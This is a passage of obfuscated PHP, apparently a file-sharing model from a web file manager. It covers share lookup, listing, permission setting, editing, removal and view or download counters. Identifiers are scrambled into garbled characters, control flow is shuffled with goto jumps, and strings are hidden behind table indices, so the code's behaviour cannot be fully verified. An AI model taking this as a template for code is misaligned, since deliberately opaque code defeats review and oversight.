$this->cacheFunctionGet($dÍã‰Ó˜¨◊[2195], $aµç¬Ãü¬É); return $d„ÊŒŸô∑Ú; } public function getInfoByHash($bÏã¢Øë±) { return $this->_getShareInfo(array($_SERVER[¯èãÄπµ][439] => $bÏã¢Øë±)); } public function getInfoByPath($e¡Íà¯¥π≈) { $Eõçå‹≈ëá =& $_SERVER[¯èãÄπµ]; $cﬁà‹êêºë = array($Eõçå‹≈ëá[1424] => USER_ID, $Eõçå‹≈ëá[365] => $e¡Íà¯¥π≈); return $this->_getShareInfo($cﬁà‹êêºë); } public function getInfoBySourcePath($e‚ê‹·∏«â) { $fúüø«≠Âπ =& $_SERVER[¯èãÄπµ]; $D°üã£å≤‡ = array($fúüø«≠Âπ[1424] => USER_ID, $fúüø«≠Âπ[1020] => $e‚ê‹·∏«â); return $this->_getShareInfo($D°üã£å≤‡); } private function _getShareInfo($b¬ßŸ√¯à©) { goto D∂∑Õê„◊Ç; FáÁ»å±ç±: if ($DˆƒÿòﬁÛî[$e–°çœÑ∫Â[365]] == $e–°çœÑ∫Â[464]) { $DˆƒÿòﬁÛî[$e–°çœÑ∫Â[387]] = IO::info($DˆƒÿòﬁÛî[$e–°çœÑ∫Â[1020]]); } else { $DˆƒÿòﬁÛî[$e–°çœÑ∫Â[387]] = Model($e–°çœÑ∫Â[1112])->pathInfo($DˆƒÿòﬁÛî[$e–°çœÑ∫Â[365]]); } $DˆƒÿòﬁÛî[$e–°çœÑ∫Â[2197]] = $AÂ±¢≤˜∏ã; return $DˆƒÿòﬁÛî; goto FîË—ŸßπØ; D∂∑Õê„◊Ç: $e–°çœÑ∫Â =& $_SERVER[¯èãÄπµ]; $DˆƒÿòﬁÛî = $this->where($b¬ßŸ√¯à©)->find(); if (!$DˆƒÿòﬁÛî) { return !1; } goto EËãé—Õ©ó; EËãé—Õ©ó: $b¬ßŸ√¯à© = array($e–°çœÑ∫Â[437] => $DˆƒÿòﬁÛî[$e–°çœÑ∫Â[437]]); $b©å≤ç∏≈… = $e–°çœÑ∫Â[2196]; $AÂ±¢≤˜∏ã = Model($e–°çœÑ∫Â[533])->order($e–°çœÑ∫Â[363])->field($b©å≤ç∏≈…)->where($b¬ßŸ√¯à©)->select(); goto FáÁ»å±ç±; FîË—ŸßπØ: } protected function getInfoAuth($Eõç”µ¯¥˜) { $C†ìÔ±∑ù› =& $_SERVER[¯èãÄπµ]; $CÆ√öµåƒú = $this->getInfo($Eõç”µ¯¥˜); $CÆ√öµåƒú[$C†ìÔ±∑ù›[372]] = Model($C†ìÔ±∑ù›[450])->authMake($CÆ√öµåƒú[$C†ìÔ±∑ù›[2197]]); return $CÆ√öµåƒú; } protected function listData($Eê¡ÔÑÃÀÚ = null, $D≠ªƒ‰∆Ö∑ = 300) { $a«íö¢ëÙ∫ =& $_SERVER[¯èãÄπµ]; $cë—ﬁ‘ø§ö = array(array($a«íö¢ëÙ∫[442] => array($a«íö¢ëÙ∫[930], 0), $a«íö¢ëÙ∫[444] => array($a«íö¢ëÙ∫[930], 0), $a«íö¢ëÙ∫[2198] => $a«íö¢ëÙ∫[2167])); if ($Eê¡ÔÑÃÀÚ == $a«íö¢ëÙ∫[1854]) { $cë—ﬁ‘ø§ö = array($a«íö¢ëÙ∫[442] => 1); } else { if ($Eê¡ÔÑÃÀÚ == $a«íö¢ëÙ∫[1009]) { $cë—ﬁ‘ø§ö = array($a«íö¢ëÙ∫[444] => 1); } } $cë—ﬁ‘ø§ö[$a«íö¢ëÙ∫[1424]] = USER_ID; $c•√ÂﬂπÖË = $this->where($cë—ﬁ‘ø§ö)->selectPage($D≠ªƒ‰∆Ö∑); return $c•√ÂﬂπÖË; } protected function listToMe($BœÙ˜¿˜õﬂ = 300) { goto aâàÚ…∑∂Ü; aâàÚ…∑∂Ü: $b§∏Êâ«¶Ÿ =& $_SERVER[¯èãÄπµ]; $Dç°⁄ﬁâœß = Session::get($b§∏Êâ«¶Ÿ[2199]); $eÌë õÌµÔ = array_to_keyvalue($Dç°⁄ﬁâœß, $b§∏Êâ«¶Ÿ[33], $b§∏Êâ«¶Ÿ[2087]); goto D‰íÒö≈¬Õ; F÷±ì…»‚·: $D”””†ê«ü = array($b§∏Êâ«¶Ÿ[2201] => $b ä˘€Éø¿, $b§∏Êâ«¶Ÿ[2202] => $AﬁåîØ“œÂ[$b§∏Êâ«¶Ÿ[347]]); return $D”””†ê«ü; goto dâÇ°√àùπ; F¬ˆÆÙÕÇ¿: $aÇΩÔªÕåÏ = array_to_keyvalue_group($AﬁåîØ“œÂ[$b§∏Êâ«¶Ÿ[350]], $b§∏Êâ«¶Ÿ[437]); if (!$aÇΩÔªÕåÏ) { return $AﬁåîØ“œÂ; } $Fá¿‘üﬂºì = $b§∏Êâ«¶Ÿ[2200]; goto bŸ˘ö∆à∫•; bŸ˘ö∆à∫•: $bãàÖ£µÉ‹ = array($b§∏Êâ«¶Ÿ[437] => array($b§∏Êâ«¶Ÿ[380], array_keys($aÇΩÔªÕåÏ))); $b ä˘€Éø¿ = $this->field($Fá¿‘üﬂºì)->where($bãàÖ£µÉ‹)->select(); foreach ($b ä˘€Éø¿ as $E¥‡ÈÊì•Ç => &$A∞Ñı¿ÛÙ¬) { $A∞Ñı¿ÛÙ¬[$b§∏Êâ«¶Ÿ[2197]] = $aÇΩÔªÕåÏ[$A∞Ñı¿ÛÙ¬[$b§∏Êâ«¶Ÿ[437]]]; } goto F÷±ì…»‚·; D‰íÒö≈¬Õ: $bãàÖ£µÉ‹ = array($b§∏Êâ«¶Ÿ[517] => SourceModel::TYPE_USER, $b§∏Êâ«¶Ÿ[452] => USER_ID); if ($eÌë õÌµÔ) { $bãàÖ£µÉ‹ = array(array($b§∏Êâ«¶Ÿ[517] => SourceModel::TYPE_USER, $b§∏Êâ«¶Ÿ[452] => USER_ID), array($b§∏Êâ«¶Ÿ[517] => SourceModel::TYPE_GROUP, $b§∏Êâ«¶Ÿ[452] => array($b§∏Êâ«¶Ÿ[7], $eÌë õÌµÔ)), $b§∏Êâ«¶Ÿ[2198] => $b§∏Êâ«¶Ÿ[2167]); } $AﬁåîØ“œÂ = Model($b§∏Êâ«¶Ÿ[533])->where($bãàÖ£µÉ‹)->selectPage($BœÙ˜¿˜õﬂ); goto F¬ˆÆÙÕÇ¿; dâÇ°√àùπ: } protected function shareAdd($BÙÔ∑†¿è, $a¡ı™ÜÃµı) { $A≤ä‰¯Á¯€ =& $_SERVER[¯èãÄπµ]; $CÂ™Ÿ¨¯…° = $this->_addShareData($BÙÔ∑†¿è, $a¡ı™ÜÃµı); if (!empty($a¡ı™ÜÃµı[$A≤ä‰¯Á¯€[2203]])) { $this->_shareAuthSet($CÂ™Ÿ¨¯…°, $a¡ı™ÜÃµı[$A≤ä‰¯Á¯€[2203]]); } $this->shareEventAdd($BÙÔ∑†¿è, $a¡ı™ÜÃµı, $A≤ä‰¯Á¯€[1012]); return $CÂ™Ÿ¨¯…°; } private function shareEventAdd($Däç¶…∏§¥, $F÷£¥»√†ú, $c†ëâºúèô = "\x61\144\144") { goto BÑëÂ¶•Óß; BÑëÂ¶•Óß: $fòßêıò™ =& $_SERVER[¯èãÄπµ]; if ($c†ëâºúèô == $fòßêıò™[1012]) { if ($F÷£¥»√†ú[$fòßêıò™[442]] == $fòßêıò™[83]) { Model($fòßêıò™[501])->eventShare($Däç¶…∏§¥, $fòßêıò™[2204]); } if ($F÷£¥»√†ú[$fòßêıò™[444]] == $fòßêıò™[83]) { Model($fòßêıò™[501])->eventShare($Däç¶…∏§¥, $fòßêıò™[2205]); } return; } $A›•çÔ«Ù = $this->getInfoByPath($Däç¶…∏§¥); goto AîãﬁçŒ∑Â; a£‰´≠›Ñ∞: return; goto DË≠ôı–≠—; e¨¡®éíªﬂ: if ($A›•çÔ«Ù[$fòßêıò™[444]] == $fòßêıò™[464] && $F÷£¥»√†ú[$fòßêıò™[444]] == $fòßêıò™[83]) { $d≤øΩ≠›È∆ = $fòßêıò™[2205]; } if ($A›•çÔ«Ù[$fòßêıò™[444]] == $fòßêıò™[83] && $F÷£¥»√†ú[$fòßêıò™[444]] == $fòßêıò™[464]) { $d≤øΩ≠›È∆ = $fòßêıò™[2208]; } Model($fòßêıò™[501])->eventShare($Däç¶…∏§¥, $d≤øΩ≠›È∆); goto a£‰´≠›Ñ∞; AîãﬁçŒ∑Â: $d≤øΩ≠›È∆ = $fòßêıò™[2206]; if ($A›•çÔ«Ù[$fòßêıò™[442]] == $fòßêıò™[464] && $F÷£¥»√†ú[$fòßêıò™[442]] == $fòßêıò™[83]) { $d≤øΩ≠›È∆ = $fòßêıò™[2204]; } if ($A›•çÔ«Ù[$fòßêıò™[442]] == $fòßêıò™[83] && $F÷£¥»√†ú[$fòßêıò™[442]] == $fòßêıò™[464]) { $d≤øΩ≠›È∆ = $fòßêıò™[2207]; } goto e¨¡®éíªﬂ; DË≠ôı–≠—: } private function _addShareData($Fë®ÌÇ èÍ, $Aº©ä£Ïé⁄ = array()) { goto d√ûÀ ÁŸ…; BçÒ™Ïäãß: $E€ä¿ÿ’í≤ = $this->add($D≠≈Ÿ–ß”ç); $AÓ≠≠¿€Æ· = array($fˆ‹é∂ﬁŸ˘[439] => short_id($E€ä¿ÿ’í≤)); $this->where(array($fˆ‹é∂ﬁŸ˘[436] => $E€ä¿ÿ’í≤))->save($AÓ≠≠¿€Æ·); goto b¿∆…èÖïä; d√ûÀ ÁŸ…: $fˆ‹é∂ﬁŸ˘ =& $_SERVER[¯èãÄπµ]; $FÂÊãÑÓ°∂ = array($fˆ‹é∂ﬁŸ˘[379] => $Fë®ÌÇ èÍ, $fˆ‹é∂ﬁŸ˘[1415] => USER_ID); if ($Fë®ÌÇ èÍ == 0) { $FÂÊãÑÓ°∂ = array($fˆ‹é∂ﬁŸ˘[2209] => $Aº©ä£Ïé⁄[$fˆ‹é∂ﬁŸ˘[1020]], $fˆ‹é∂ﬁŸ˘[1415] => USER_ID); } goto d∆ÒÍé÷†π; a‚åÇıÙá◊: $D≠≈Ÿ–ß”ç = array($fˆ‹é∂ﬁŸ˘[1415] => USER_ID, $fˆ‹é∂ﬁŸ˘[379] => $Fë®ÌÇ èÍ, $fˆ‹é∂ﬁŸ˘[1332] => $fˆ‹é∂ﬁŸ˘[33], $fˆ‹é∂ﬁŸ˘[442] => 0, $fˆ‹é∂ﬁŸ˘[444] => 0, $fˆ‹é∂ﬁŸ˘[1020] => $fˆ‹é∂ﬁŸ˘[33], $fˆ‹é∂ﬁŸ˘[291] => $fˆ‹é∂ﬁŸ˘[33], $fˆ‹é∂ﬁŸ˘[806] => $fˆ‹é∂ﬁŸ˘[33], $fˆ‹é∂ﬁŸ˘[2210] => 0, $fˆ‹é∂ﬁŸ˘[2211] => 0, $fˆ‹é∂ﬁŸ˘[706] => 0, $fˆ‹é∂ﬁŸ˘[2212] => $fˆ‹é∂ﬁŸ˘[33], $fˆ‹é∂ﬁŸ˘[439] => $fˆ‹é∂ﬁŸ˘[33]); $FÎâ‰ÃñÊ‘ = explode($fˆ‹é∂ﬁŸ˘[47], $fˆ‹é∂ﬁŸ˘[2213]); foreach ($FÎâ‰ÃñÊ‘ as $DŸ—°–ô»‹) { if (!isset($Aº©ä£Ïé⁄[$DŸ—°–ô»‹])) { continue; } $D≠≈Ÿ–ß”ç[$DŸ—°–ô»‹] = $Aº©ä£Ïé⁄[$DŸ—°–ô»‹]; } goto BçÒ™Ïäãß; d∆ÒÍé÷†π: if ($Fœ≈ùóÂàè = $this->where($FÂÊãÑÓ°∂)->find()) { return $Fœ≈ùóÂàè[$fˆ‹é∂ﬁŸ˘[437]]; } if ($Fë®ÌÇ èÍ == 0) { $aì¢ëñå≥Ë = array($fˆ‹é∂ﬁŸ˘[28] => get_path_this($Aº©ä£Ïé⁄[$fˆ‹é∂ﬁŸ˘[75]])); } else { $aì¢ëñå≥Ë = Model($fˆ‹é∂ﬁŸ˘[755])->sourceInfo($Fë®ÌÇ èÍ); if (!$aì¢ëñå≥Ë) { return !1; } } if (!$Aº©ä£Ïé⁄[$fˆ‹é∂ﬁŸ˘[1332]]) { $Aº©ä£Ïé⁄[$fˆ‹é∂ﬁŸ˘[1332]] = $aì¢ëñå≥Ë[$fˆ‹é∂ﬁŸ˘[28]]; } goto a‚åÇıÙá◊; b¿∆…èÖïä: return $E€ä¿ÿ’í≤; goto bÑπçÏ∞∂ÿ; bÑπçÏ∞∂ÿ: } private function _shareAuthSet($AÙΩÈÉ∑Ú—, $eñÕı¯ÜÿÎ) { goto Cˆ∂ÜÕÒ¬§; CÉêÇ®ƒéÒ: return $aﬁÜéí∆ˆÖ->addAll($e…ÏÈ‹ßÂ®, array(), !0); goto D·˘µÙÆ´; Cˆ∂ÜÕÒ¬§: $fæôâ≥°ßƒ =& $_SERVER[¯èãÄπµ]; if (!is_array($eñÕı¯ÜÿÎ)) { return !1; } $aﬁÜéí∆ˆÖ = Model($fæôâ≥°ßƒ[2214]); goto cí∂ÍÜ‰¯æ; cí∂ÍÜ‰¯æ: $aﬁÜéí∆ˆÖ->where(array($fæôâ≥°ßƒ[437] => $AÙΩÈÉ∑Ú—))->delete(); $e…ÏÈ‹ßÂ® = array(); foreach ($eñÕı¯ÜÿÎ as $AÖ©∞Ïä∫¨) { $DÂ¨¨ßè˘â = SourceModel::TYPE_USER; if ($AÖ©∞Ïä∫¨[$fæôâ≥°ßƒ[367]] == SourceModel::TYPE_GROUP) { $DÂ¨¨ßè˘â = SourceModel::TYPE_GROUP; } $BÖÁ ©êÉ˘ = array($fæôâ≥°ßƒ[437] => $AÙΩÈÉ∑Ú—, $fæôâ≥°ßƒ[367] => $DÂ¨¨ßè˘â, $fæôâ≥°ßƒ[452] => intval($AÖ©∞Ïä∫¨[$fæôâ≥°ßƒ[452]]), $fæôâ≥°ßƒ[2215] => 0, $fæôâ≥°ßƒ[2216] => -1); if ($AÖ©∞Ïä∫¨[$fæôâ≥°ßƒ[2215]]) { $BÖÁ ©êÉ˘[$fæôâ≥°ßƒ[2215]] = $AÖ©∞Ïä∫¨[$fæôâ≥°ßƒ[2215]]; } else { if ($AÖ©∞Ïä∫¨[$fæôâ≥°ßƒ[2216]]) { $BÖÁ ©êÉ˘[$fæôâ≥°ßƒ[2216]] = $AÖ©∞Ïä∫¨[$fæôâ≥°ßƒ[2216]]; } } $e…ÏÈ‹ßÂ®[] = $BÖÁ ©êÉ˘; } goto CÉêÇ®ƒéÒ; D·˘µÙÆ´: } public function numViewAdd($BïÔëÑΩêë) { $b‡ÎìÚÈÈı =& $_SERVER[¯èãÄπµ]; $C€‹ø‘çê√ = array($b‡ÎìÚÈÈı[436] => $BïÔëÑΩêë); $this->where($C€‹ø‘çê√)->setAdd($b‡ÎìÚÈÈı[2210]); } public function numDownloadAdd($d…àëÍ—ô£) { $fë≠ë˘«¶Ã =& $_SERVER[¯èãÄπµ]; $f…”¥Œ∏ÿõ = array($fë≠ë˘«¶Ã[436] => $d…àëÍ—ô£); $this->where($f…”¥Œ∏ÿõ)->setAdd($fë≠ë˘«¶Ã[2211]); } protected function shareEdit($fﬁƒÔ’å’Î, $aàÜ Áı∂…) { goto c«áµáÑ»‘; AõŒÒòªû∫: $this->_checkLinkShare($aàÜ Áı∂…, $eΩ‰·åÜº); $FÆîÒáπ´Ü = array(); $eì⁄ç≥‰ÂÍ = explode($fÕ“è™ìßå[47], $fÕ“è™ìßå[2217]); goto EÃ¿â√Í’ø; bîâÍ¬´ò¯: if (isset($aàÜ Áı∂…[$fÕ“è™ìßå[2203]])) { $this->_shareAuthSet($fﬁƒÔ’å’Î, $aàÜ Áı∂…[$fÕ“è™ìßå[2203]]); } return !0; goto CëàºÑøÁ±; EÃ¿â√Í’ø: foreach ($eì⁄ç≥‰ÂÍ as $FàØÇúÓå®) { if (!array_key_exists($FàØÇúÓå®, $aàÜ Áı∂…)) { continue; } $FÆîÒáπ´Ü[$FàØÇúÓå®] = $aàÜ Áı∂…[$FàØÇúÓå®]; } $this->shareEventAdd($eΩ‰·åÜº[$fÕ“è™ìßå[365]], $aàÜ Áı∂…, $fÕ“è™ìßå[2055]); $this->where(array($fÕ“è™ìßå[436] => $fﬁƒÔ’å’Î))->save($FÆîÒáπ´Ü); goto bîâÍ¬´ò¯; c«áµáÑ»‘: $fÕ“è™ìßå =& $_SERVER[¯èãÄπµ]; $eΩ‰·åÜº = $this->getInfo($fﬁƒÔ’å’Î); if (!$eΩ‰·åÜº) { return !1; } goto AõŒÒòªû∫; CëàºÑøÁ±: } private function _checkLinkShare($C‘äóã™÷ª, $aò©ïÃë‰ÿ) { goto fø„úÍåÍï; fÏôø£ÎÚÓ: if ($aò©ïÃë‰ÿ[$EÛ’¢‘€à•[387]][$EÛ’¢‘€à•[29]] != $EÛ’¢‘€à•[163]) { $d¡¶øû…ñ¿ = $this->_folderReport($c¨É„ö‰ëì); if (!$d¡¶øû…ñ¿) { return; } show_json(LNG($EÛ’¢‘€à•[2218]) . $EÛ’¢‘€à•[2219] . $d¡¶øû…ñ¿, !1); } $EÉ·ää»Ñ› = Model($EÛ’¢‘€à•[755])->fileInfoGet($aò©ïÃë‰ÿ[$EÛ’¢‘€à•[387]][$EÛ’¢‘€à•[365]]); if (!$EÉ·ää»Ñ›) { return; } goto aÍ≈†ÖÌï≠; aÍ≈†ÖÌï≠: $aÂèíÜÑç = $this->shareFileMeta($EÉ·ää»Ñ›[$EÛ’¢‘€à•[415]]); if (isset($aÂèíÜÑç[$EÛ’¢‘€à•[355]]) && $aÂèíÜÑç[$EÛ’¢‘€à•[355]] == $EÛ’¢‘€à•[83]) { show_json(LNG($EÛ’¢‘€à•[2220]), !1); } goto Fíÿ∫∫ÆÃ; fø„úÍåÍï: $EÛ’¢‘€à• =& $_SERVER[¯èãÄπµ]; if ($C‘äóã™÷ª[$EÛ’¢‘€à•[442]] != $EÛ’¢‘€à•[83]) { return; } $c¨É„ö‰ëì = $aò©ïÃë‰ÿ[$EÛ’¢‘€à•[387]][$EÛ’¢‘€à•[365]]; goto fÏôø£ÎÚÓ; Fíÿ∫∫ÆÃ: } private function _folderReport($eÑ‘ƒÍ≠’‚) { goto D √æÉ—É; Eï≈Ô”Âµé: if (!$b·±†”·ãë) { return !1; } $b·±†”·ãë = array_to_keyvalue($b·±†”·ãë, $e™äÜ∂€Ô [33], $e™äÜ∂€Ô [415]); $B⁄”å∫ÆòÚ = $e™äÜ∂€Ô [47] . $eÑ‘ƒÍ≠’‚ . $e™äÜ∂€Ô [47]; goto cΩä≤ÏÉ„; dﬂïìµºÌ”: $EúÊßºëº∞ = substr($a‹ÃÉππù¨[$e™äÜ∂€Ô [455]], strpos($a‹ÃÉππù¨[$e™äÜ∂€Ô [455]], $B⁄”å∫ÆòÚ)); $a»ñÏ«Û‡π = array($e™äÜ∂€Ô [365] => array($e™äÜ∂€Ô [7], trim($EúÊßºëº∞, $e™äÜ∂€Ô [47]))); $dÚ∆ª‰â±’ = Model($e™äÜ∂€Ô [755])->where($a»ñÏ«Û‡π)->field($e™äÜ∂€Ô [28])->select(); goto Fº˜ÂØ∑—§; D √æÉ—É: $e™äÜ∂€Ô  =& $_SERVER[¯èãÄπµ]; $a»ñÏ«Û‡π = array($e™äÜ∂€Ô [415] => array($e™äÜ∂€Ô [930], 0), $e™äÜ∂€Ô [692] => 3); $b·±†”·ãë = Model($e™äÜ∂€Ô [2221])->where($a»ñÏ«Û‡π)->field($e™äÜ∂€Ô [415])->select(); goto Eï≈Ô”Âµé; cΩä≤ÏÉ„: $a»ñÏ«Û‡π = array($e™äÜ∂€Ô [415] => array($e™äÜ∂€Ô [7], $b·±†”·ãë), $e™äÜ∂€Ô [455] => array($e™äÜ∂€Ô [754], "\x25{$B⁄”å∫ÆòÚ}\45"), $e™äÜ∂€Ô [393] => 0); $a‹ÃÉππù¨ = Model($e™äÜ∂€Ô [755])->where($a»ñÏ«Û‡π)->field($e™äÜ∂€Ô [2222])->find(); if (!$a‹ÃÉππù¨) { return !1; } goto dﬂïìµºÌ”; Fº˜ÂØ∑—§: $AÊÆ”õîå∆ = array_to_keyvalue($dÚ∆ª‰â±’, $e™äÜ∂€Ô [33], $e™äÜ∂€Ô [28]); $AÊÆ”õîå∆[] = $a‹ÃÉππù¨[$e™äÜ∂€Ô [28]]; return implode($e™äÜ∂€Ô [8], $AÊÆ”õîå∆); goto Có¨ã«Ñ˜Ù; Có¨ã«Ñ˜Ù: } protected function remove($Cëß∏âîäî) { goto CëΩá¯Ô™ã; fÇéÔµï†Ú: for ($Dá€”œèÃÏ = 0; $Dá€”œèÃÏ < count($aÆ∫ãõ¬ëä); $Dá€”œèÃÏ++) { $c˘Ã‚Ü†Ÿ» = $this->getInfo($aÆ∫ãõ¬ëä[$Dá€”œèÃÏ]); if ($c˘Ã‚Ü†Ÿ»[$C†–Ç«Óã÷[444]] == $C†–Ç«Óã÷[83]) { Model($C†–Ç«Óã÷[501])->eventShare($c˘Ã‚Ü†Ÿ»[$C†–Ç«Óã÷[365]], $C†–Ç«Óã÷[2208]); } if ($c˘Ã‚Ü†Ÿ»[$C†–Ç«Óã÷[442]] == $C†–Ç«Óã÷[83]) { Model($C†–Ç«Óã÷[501])->eventShare($c˘Ã‚Ü†Ÿ»[$C†–Ç«Óã÷[365]], $C†–Ç«Óã÷[2207]); } } return $B…œ…¯∞Øª; goto A¨ƒ‡ƒû„◊; cïı¯Ö ◊è: $B…œ…¯∞Øª = $this->where($cæîÂΩ˜∆≥)->delete(); if ($B…œ…¯∞Øª) { Model($C†–Ç«Óã÷[533])->where(array($C†–Ç«Óã÷[437] => $Cëß∏âîäî))->delete(); } $aÆ∫ãõ¬ëä = is_array($Cëß∏âîäî) ? $Cëß∏âîäî[1] : array($Cëß∏âîäî); goto fÇéÔµï†Ú; CëΩá¯Ô™ã: $C†–Ç«Óã÷ =& $_SERVER[¯èãÄπµ]; if (is_array($Cëß∏âîäî)) { $Cëß∏âîäî = array($C†–Ç«Óã÷[7], $Cëß∏âîäî); } $cæîÂΩ˜∆≥ = array($C†–Ç«Óã÷[437] => $Cëß∏âîäî); goto cïı¯Ö ◊è; A¨ƒ‡ƒû„◊: } protected function removeBySource($D≈ÜëëìºÉ) { goto cÇÔÙ”û¯ä; cÇÔÙ”û¯ä: $E˜È·Èæ˜√ =& $_SERVER[¯èãÄπµ]; $B…âí‰–çü = array($E˜È·Èæ˜√[379] => array($E˜È·Èæ˜√[380], $D≈ÜëëìºÉ)); $F˜ŒÁ‘◊”Ç = $this->field($E˜È·Èæ˜√[437])->where($B…âí‰–çü)->select(); goto cüˆ¥ëÑ¶î; EäŒíÎÑˆ‹: $this->where($B…âí‰–çü)->delete(); Model($E˜È·Èæ˜√[533])->where($B…âí‰–çü)->delete(); goto f≈ù∫†¢ŸÉ; cüˆ¥ëÑ¶î: $F˜ŒÁ‘◊”Ç = array_to_keyvalue($F˜ŒÁ‘◊”Ç, $E˜È·Èæ˜√[33], $E˜È·Èæ˜√[437]); if (!$F˜ŒÁ‘◊”Ç) { return; } $B…âí‰–çü = array($E˜È·Èæ˜√[436] => array($E˜È·Èæ˜√[380], $F˜ŒÁ‘◊”Ç)); goto EäŒíÎÑˆ‹; f≈ù∫†¢ŸÉ: } public function listAll($cÌäüö∫‡É) { goto b ‚æ≈ƒÇ≠; cËç…ﬁ’»é: if ($cÌäüö∫‡É[$BèÉûúÜ‘Æ[705]]) { $E∫Í“çÌ÷º = $cÌäüö∫‡É[$BèÉûúÜ‘Æ[706]] ? $cÌäüö∫‡É[$BèÉûúÜ‘Æ[706]] : strtotime(date($BèÉûúÜ‘Æ[2223])); $cõ∑®ÑÎ»’[$BèÉûúÜ‘Æ[183]] = array($BèÉûúÜ‘Æ[317], array($cÌäüö∫‡É[$BèÉûúÜ‘Æ[705]], $E∫Í“çÌ÷º)); } if ($cÌäüö∫‡É[$BèÉûúÜ‘Æ[29]]) { $cõ∑®ÑÎ»’[$cÌäüö∫‡É[$BèÉûúÜ‘Æ[29]]] = 1; } else { $cõ∑®ÑÎ»’[] = array($BèÉûúÜ‘Æ[442] => array($BèÉûúÜ‘Æ[930], 0), $BèÉûúÜ‘Æ[444] => array($BèÉûúÜ‘Æ[930], 0), $BèÉûúÜ‘Æ[2198] => $BèÉûúÜ‘Æ[2167]); } if ($cÌäüö∫‡É[$BèÉûúÜ‘Æ[2163]]) { $cõ∑®ÑÎ»’[] = array($BèÉûúÜ‘Æ[439] => $cÌäüö∫‡É[$BèÉûúÜ‘Æ[2163]], $BèÉûúÜ‘Æ[1332] => array($BèÉûúÜ‘Æ[754], "\x25{$cÌäüö∫‡É[$BèÉûúÜ‘Æ[2163]]}\x25"), $BèÉûúÜ‘Æ[2198] => $BèÉûúÜ‘Æ[2167]); } goto CÏ«“Ãÿ√Ù; c§≤Î¡û…Õ: return $aù’ÊÔ∂…ö; goto CÇ©êÿÂõÓ; CÏ«“Ãÿ√Ù: $aù’ÊÔ∂…ö = $this->_makeOrder()->where($cõ∑®ÑÎ»’)->selectPage(20); if (empty($aù’ÊÔ∂…ö[$BèÉûúÜ‘Æ[350]])) { return array(); } $this->_listDataApply($aù’ÊÔ∂…ö[$BèÉûúÜ‘Æ[350]]); goto c§≤Î¡û…Õ; b ‚æ≈ƒÇ≠: $BèÉûúÜ‘Æ =& $_SERVER[¯èãÄπµ]; $cõ∑®ÑÎ»’ = array(); if ($cÌäüö∫‡É[$BèÉûúÜ‘Æ[1424]]) { $cõ∑®ÑÎ»’[$BèÉûúÜ‘Æ[1424]] = $cÌäüö∫‡É[$BèÉûúÜ‘Æ[1424]]; } goto cËç…ﬁ’»é; CÇ©êÿÂõÓ: } public function listDataApply($eõÎ‘¬Ø¨¥) { $this->_listDataApply($eõÎ‘¬Ø¨¥); return $eõÎ‘¬Ø¨¥; } private function _listDataApply(&$bôµíöüÙ…) { $Dû¡∑ªê´¶ =& $_SERVER[¯èãÄπµ]; $Eƒ‡å®ó·ú = array_to_keyvalue($bôµíöüÙ…, $Dû¡∑ªê´¶[33], $Dû¡∑ªê´¶[1424]); $C¢Õ…ë∏Àœ = Model($Dû¡∑ªê´¶[473])->userListInfo(array_unique($Eƒ‡å®ó·ú)); $dõ‘¡ä∞ÿò = array_to_keyvalue($bôµíöüÙ…, $Dû¡∑ªê´¶[33], $Dû¡∑ªê´¶[365]); $Fä€ˆ≤ÕÿÊ = Model($Dû¡∑ªê´¶[755])->sourceListInfo($dõ‘¡ä∞ÿò, !0); foreach ($bôµíöüÙ… as &$e„®√í⁄∆ƒ) { $AâπÂØ∆ÿª = $e„®√í⁄∆ƒ[$Dû¡∑ªê´¶[1424]]; $e„®√í⁄∆ƒ[$Dû¡∑ªê´¶[2224]] = $C¢Õ…ë∏Àœ[$AâπÂØ∆ÿª] ? $C¢Õ…ë∏Àœ[$AâπÂØ∆ÿª] : !1; $fäå§ø†æì = $e„®√í⁄∆ƒ[$Dû¡∑ªê´¶[365]]; $e„®√í⁄∆ƒ[$Dû¡∑ªê´¶[387]] = $Fä€ˆ≤ÕÿÊ[$fäå§ø†æì] ? $Fä€ˆ≤ÕÿÊ[$fäå§ø†æì] : !1; } } private function _makeOrder($cı≤ƒÆ§ÌÂ = '') { goto d≥ﬁﬁÑãë˘; d≥ﬁﬁÑãë˘: $C≠Öπãû‡´ =& $_SERVER[¯èãÄπµ]; $dÊâñÆ≤†± = array($C≠Öπãû‡´[183], $C≠Öπãû‡´[706], $C≠Öπãû‡´[2210], $C≠Öπãû‡´[2211]); $aã•ß∏äá‰ = array($C≠Öπãû‡´[398] => $C≠Öπãû‡´[399], $C≠Öπãû‡´[400] => $C≠Öπãû‡´[401]); goto bÜªÃá—‘í; aÜ±·Éﬂñä: $cı≤ƒÆ§ÌÂ = $cı≤ƒÆ§ÌÂ . "{$b∂≠øê›¢´}\40{$a¶ò∫ˆ£àÇ}"; return $this->order($cı≤ƒÆ§ÌÂ); goto D¶çó¶∏Ï¿; bÜªÃá—‘í: $b∂≠øê›¢´ = Input::get($C≠Öπãû‡´[403], $C≠Öπãû‡´[7], $C≠Öπãû‡´[385], $dÊâñÆ≤†±); $a¶ò∫ˆ£àÇ = Input::get($C≠Öπãû‡´[404], $C≠Öπãû‡´[7], $C≠Öπãû‡´[2225], array($C≠Öπãû‡´[2162], $C≠Öπãû‡´[400])); $a¶ò∫ˆ£àÇ = $aã•ß∏äá‰[$a¶ò∫ˆ£àÇ]; goto aÜ±·Éﬂñä; D¶çó¶∏Ï¿: } public function reportAdd($F‡√ÒÇÊéŸ) { $Dï∞ôë÷ﬂÿ =& $_SERVER[¯èãÄπµ]; $bÏÿ÷ıÉ§° = array($Dï∞ôë÷ﬂÿ[437] => $F‡√ÒÇÊéŸ[$Dï∞ôë÷ﬂÿ[437]], $Dï∞ôë÷ﬂÿ[1424] => USER_ID); if (Model($Dï∞ôë÷ﬂÿ[2221])->where($bÏÿ÷ıÉ§°)->find()) { return !1; } $Cæ¬ïòØ™ª = array($Dï∞ôë÷ﬂÿ[437] => $F‡√ÒÇÊéŸ[$Dï∞ôë÷ﬂÿ[437]], $Dï∞ôë÷ﬂÿ[1332] => $F‡√ÒÇÊéŸ[$Dï∞ôë÷ﬂÿ[1332]], $Dï∞ôë÷ﬂÿ[365] => $F‡√ÒÇÊéŸ[$Dï∞ôë÷ﬂÿ[365]], $Dï∞ôë÷ﬂÿ[415] => $F‡√ÒÇÊéŸ[$Dï∞ôë÷ﬂÿ[415]], $Dï∞ôë÷ﬂÿ[1424] => USER_ID, $Dï∞ôë÷ﬂÿ[29] => $F‡√ÒÇÊéŸ[$Dï∞ôë÷ﬂÿ[29]], $Dï∞ôë÷ﬂÿ[401] => 